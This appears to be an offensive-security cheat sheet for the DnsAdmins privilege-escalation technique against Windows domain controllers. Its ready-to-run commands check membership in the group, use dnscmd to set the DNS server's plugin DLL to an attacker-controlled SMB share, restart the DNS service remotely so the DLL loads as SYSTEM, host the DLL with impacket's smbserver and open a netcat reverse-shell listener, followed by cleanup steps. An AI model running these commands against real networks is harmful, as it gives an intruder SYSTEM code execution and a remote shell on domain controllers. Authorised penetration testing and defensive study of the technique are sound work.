---
technique: DnsAdmins Abuse
category: builtins
targets: DNS Server, Domain Controller
protocols: DNS, SMB, RPC
remote_capable: true
tags: dnsadmins dnscmd serverlevelplugindll dll-execution domain-controller ad
---

# DnsAdmins Abuse

Members of `DnsAdmins` can configure a DNS server to load a server-level plugin DLL. On domain controllers that also run DNS, the DNS service loads the DLL as `NT AUTHORITY\SYSTEM` when the service starts, turning DNS administration rights into code execution on the DC.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| DnsAdmins membership | The user must be able to configure the target DNS server |
| DNS service on target | The server must run the Windows DNS service |
| Reachable DLL path | The DNS service must be able to read the plugin DLL, commonly over SMB |
| Service restart path | Code execution occurs when the DNS service loads or reloads the plugin |

## Windows

### Check group membership

#cmd #recon

Confirm whether the current or target user belongs to `DnsAdmins`.

```cmd title:"Check domain user group membership"
net user %username% /domain
```
<!-- cheat -->

### Test plugin export locally

#cmd #dll

Run the DLL export locally to verify that the plugin entry point executes before loading it through DNS.

```cmd title:"Test DNS plugin DLL export with rundll32"
rundll32.exe .\dns_plugin.dll,DnsPluginInitialize
```
<!-- cheat -->

### Configure DNS plugin DLL

#cmd #dnscmd #dll

Set the DNS server-level plugin DLL path to an attacker-controlled SMB path.

```cmd title:"Configure DNS ServerLevelPluginDll with dnscmd"
dnscmd.exe %dc_host% /config /serverlevelplugindll \\%lhost%\%share%\%dll_file%
```
<!-- cheat
var dc_host
var lhost
var share
var dll_file
-->

### Verify plugin registry value

#powershell #registry

Check the local DNS service configuration for the plugin DLL value.

```powershell title:"Read DNS ServerLevelPluginDll registry value"
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
```
<!-- cheat -->

### Stop DNS service

#cmd #service-control

Stop the DNS service so it can reload configuration.

```cmd title:"Stop DNS service remotely"
sc.exe \\%dc_host% stop dns
```
<!-- cheat
var dc_host
-->

### Start DNS service

#cmd #service-control

Start the DNS service so it loads the configured plugin DLL.

```cmd title:"Start DNS service remotely"
sc.exe \\%dc_host% start dns
```
<!-- cheat
var dc_host
-->

### Query remote plugin registry value

#cmd #registry

Query the remote DNS plugin registry configuration during cleanup or validation.

```cmd title:"Query remote DNS plugin registry value"
reg query \\%dc_host%\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```
<!-- cheat
var dc_host
-->

### Remove plugin registry value

#cmd #registry #cleanup

Remove the configured DNS plugin DLL path from the target server.

```cmd title:"Remove DNS ServerLevelPluginDll registry value"
reg delete \\%dc_host%\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```
<!-- cheat
var dc_host
-->

## Linux

### Host DLL over SMB

#impacket #smb

Expose the plugin DLL directory over SMB so the DNS service can retrieve it from a UNC path.

```sh title:"Serve DNS plugin DLL directory over SMB"
smbserver.py "$share" "$payload_dir"
```
<!-- cheat
var share
var payload_dir
-->

### Start reverse shell listener

#netcat #listener

Start a listener for a plugin payload that calls back to the operator host.

```sh title:"Start reverse shell listener"
nc -lvnp $lport
```
<!-- cheat
var lport
-->
